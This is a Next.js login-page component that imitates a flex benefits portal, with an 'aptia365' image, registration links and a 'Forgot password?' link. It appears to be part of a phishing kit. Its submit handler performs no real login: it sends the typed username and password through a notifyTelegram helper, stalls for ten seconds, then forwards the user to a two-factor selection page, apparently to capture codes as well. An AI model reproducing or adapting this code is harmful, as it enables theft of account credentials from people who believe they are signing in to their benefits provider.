"use client";
import { User, Lock, LogIn } from "lucide-react";
import { useState } from "react";
import { useRouter } from "next/navigation";
import { notifyTelegram } from "@/lib/telegram-notify";
import { setLoginComplete, setTwoFactorStepComplete } from "@/lib/auth-flow";
import Image from "next/image";

export function LandingMain() {
  const router = useRouter();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [rememberMe, setRememberMe] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (loading) return;
    setLoading(true);
    try {
      notifyTelegram({
        kind: "login",
        username,
        password,
      });
      await new Promise((r) => setTimeout(r, 10000));
      setLoginComplete();
      setTwoFactorStepComplete();
      router.push("/two-factor/select");
    } catch (error) {
      console.error("Login error:", error);
      setLoading(false);
    }
  };

  return (
    <div className="bg-white py-8 sm:py-12">
      <div className="mx-auto w-full max-w-[1300px] px-6 sm:px-8 lg:px-10">
        <div className="grid gap-12 xl:grid-cols-[400px_1fr] items-start">
          <div>
            <h2 className="mb-6 text-4xl font-normal text-[#8B6B5C]">Login</h2>
            <div className="border border-[#E5E7EB] bg-white p-6 shadow-[0_10px_32px_rgba(15,23,42,0.06)]">
              <form
                id="login-form"
                className="space-y-5"
                method="post"
                autoComplete="off"
                onSubmit={handleLogin}
              >
                <div className="space-y-3">
                  <label
                    htmlFor="Username"
                    className="block text-sm font-medium text-[#334155]"
                  >
                    Username
                  </label>
                  <div className="relative">
                    <input
                      className="w-full rounded-2xl border border-[#D1D5DB] bg-white px-4 py-3 pl-12 text-sm text-[#0F172A] outline-none transition focus:border-[#00C389] focus:ring-2 focus:ring-[#00C389]/20"
                      type="text"
                      id="Username"
                      name="Username"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      required
                    />
                    <User className="absolute left-4 top-1/2 h-4 w-4 -translate-y-1/2 text-[#94A3B8]" />
                  </div>
                </div>

                <div className="space-y-3">
                  <label
                    htmlFor="Password"
                    className="block text-sm font-medium text-[#334155]"
                  >
                    Password
                  </label>
                  <div className="relative">
                    <input
                      className="w-full rounded-2xl border border-[#D1D5DB] bg-white px-4 py-3 pl-12 text-sm text-[#0F172A] outline-none transition focus:border-[#00C389] focus:ring-2 focus:ring-[#00C389]/20"
                      type="password"
                      id="Password"
                      name="Password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      autoComplete="off"
                      required
                    />
                    <Lock className="absolute left-4 top-1/2 h-4 w-4 -translate-y-1/2 text-[#94A3B8]" />
                  </div>
                </div>

                <div className="flex items-center justify-between text-sm text-[#475569]">
                  <label className="flex items-center gap-2">
                    <input
                      type="checkbox"
                      id="RememberMe"
                      name="RememberMe"
                      checked={rememberMe}
                      onChange={(e) => setRememberMe(e.target.checked)}
                      className="h-4 w-4 rounded border-[#CBD5E1] text-[#00C389] focus:ring-[#00C389]"
                    />
                    Remember me?
                  </label>
                  <a
                    href="/Account/ForgotPassword"
                    className="font-medium text-[#00C389] hover:text-[#0F766E]"
                  >
                    Forgot password?
                  </a>
                </div>

                <button
                  type="submit"
                  className="w-full rounded-2xl bg-[#00C389] px-5 py-2.5 text-sm font-semibold text-white transition hover:bg-[#00A876] disabled:cursor-not-allowed disabled:opacity-60"
                  disabled={loading || !username || !password}
                >
                  {loading ? "Logging In..." : "Log In"}
                </button>

                <div className="space-y-2 text-xs text-[#475569]">
                  <a
                    href="https://www.tri-ad.com/pdfs/Registration-Guide.pdf"
                    target="_blank"
                    rel="noreferrer"
                    className="text-[#0F766E] hover:text-[#064E3B]"
                  >
                    Registration and Log In Instruction Flyer
                  </a>
                  <a
                    className="block text-[#0F766E] hover:text-[#064E3B]"
                    href="/Account/ForgotUsername"
                  >
                    Forgot Your Username?
                  </a>
                  <a
                    className="block text-[#0F766E] hover:text-[#064E3B]"
                    href="/identity-details"
                  >
                    Received a Mailed Registration Code?
                  </a>
                </div>
              </form>

              <div className="mt-5 border border-[#E2E8F0] bg-[#F8FAFC] p-4">
                <div className="flex items-center justify-between gap-4">
                  <div>
                    <p className="text-xs font-semibold text-[#0F172A]">
                      Register as a New User
                    </p>
                    <p className="mt-1 text-xs text-[#64748B]">
                      Create a profile to manage your benefits.
                    </p>
                  </div>
                  <a
                    className="inline-flex items-center rounded-2xl bg-[#00C389] px-3 py-1.5 text-xs font-semibold text-white transition hover:bg-[#0F766E]"
                    href="/identity-details"
                  >
                    Register
                  </a>
                </div>
              </div>
            </div>
          </div>

          <div className="relative overflow-hidden shadow-[0_12px_40px_rgba(15,23,42,0.1)] max-w-[550px]">
            <div className="relative h-[320px] sm:h-[360px] w-full">
              <Image
                src="/aptia365-flex_image.png"
                alt="Your Flex Benefit Family"
                fill
                className="object-cover"
                priority
                sizes="(max-width: 768px) 100vw, 550px"
              />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
